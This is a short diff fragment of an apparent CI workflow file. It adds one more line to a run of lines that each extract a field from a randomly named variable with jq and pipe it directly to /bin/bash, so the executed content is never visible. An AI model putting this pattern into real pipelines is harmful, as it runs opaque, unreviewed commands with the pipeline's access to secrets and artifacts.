@@ -27,6 +27,7 @@ jobs:
           echo $is6 | jq -r .qhfnd8 | /bin/bash
           echo $tmr1 | jq -r .ptca168 | /bin/bash
           echo $qpnyz9 | jq -r .ev7295 | /bin/bash
+          echo $utaq9460 | jq -r .tdic9 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
